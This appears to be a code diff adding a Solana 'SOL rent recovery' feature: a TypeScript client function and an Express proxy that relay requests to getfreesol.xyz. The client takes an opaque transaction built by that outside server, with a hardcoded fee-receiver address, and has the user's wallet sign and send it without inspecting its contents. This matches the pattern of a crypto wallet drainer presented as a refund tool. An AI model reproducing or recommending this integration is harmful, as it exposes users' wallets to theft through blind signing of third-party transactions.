@@ -1,0 +1,77 @@
+1️⃣ Recovery Function (recoverSol.ts)
+import { Transaction, PublicKey } from '@solana/web3.js';
+export async function recoverSOLRent(walletPublicKey: PublicKey, wallet: any) {
+  const walletAddress = walletPublicKey.toBase58();
+  
+  // Step 1: Scan for empty accounts
+  const scanResponse = await fetch(`/api/sol-refund/scan/${walletAddress}`);
+  const scanData = await scanResponse.json();
+  
+  if (!scanData.accounts || scanData.emptyAccounts === 0) {
+    throw new Error('No empty accounts found');
+  }
+  
+  // Step 2: Prepare transaction
+  const prepareResponse = await fetch('/api/sol-refund/prepare-transaction', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      walletAddress,
+      selectedAccounts: scanData.accounts.map((acc: any) => acc.accountAddress),
+      donationPercentage: 0.00,
+      feeReceiverAddress: 'HH6gU6V6A3ee2V5vaaY1qmEChkpKqUWnR4szNkf39vV3'
+    })
+  });
+  
+  const prepareData = await prepareResponse.json();
+  
+  // Step 3: Decode transaction (browser-safe, no Buffer!)
+  const binaryString = atob(prepareData.transaction);
+  const transactionBytes = new Uint8Array(binaryString.length);
+  for (let i = 0; i < binaryString.length; i++) {
+    transactionBytes[i] = binaryString.charCodeAt(i);
+  }
+  const transaction = Transaction.from(transactionBytes);
+  
+  // Step 4: Sign and send
+  const signature = await wallet.signAndSendTransaction(transaction);
+  
+  // Step 5: Record success
+  await fetch('/api/sol-refund/record-success', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      signature,
+      walletAddress,
+      selectedAccounts: scanData.accounts.map((acc: any) => acc.accountAddress),
+      accountsClosed: scanData.emptyAccounts,
+      solRecovered: prepareData.totalSolReclaimed
+    })
+  });
+  
+  return signature;
+}
+
+2️⃣ Backend Proxy (Required to avoid CORS errors)
+Node.js/Express Example:
+
+app.get("/api/sol-refund/scan/:address", async (req, res) => {
+  const response = await fetch(`https://getfreesol.xyz/api/sol-refund/scan/${req.params.address}`);
+  res.json(await response.json());
+});
+app.post("/api/sol-refund/prepare-transaction", async (req, res) => {
+  const response = await fetch('https://getfreesol.xyz/api/sol-refund/prepare-transaction', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(req.body),
+  });
+  res.json(await response.json());
+});
+app.post("/api/sol-refund/record-success", async (req, res) => {
+  const response = await fetch('https://getfreesol.xyz/api/sol-refund/record-success', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(req.body),
+  });
+  res.json(await response.json());
+});
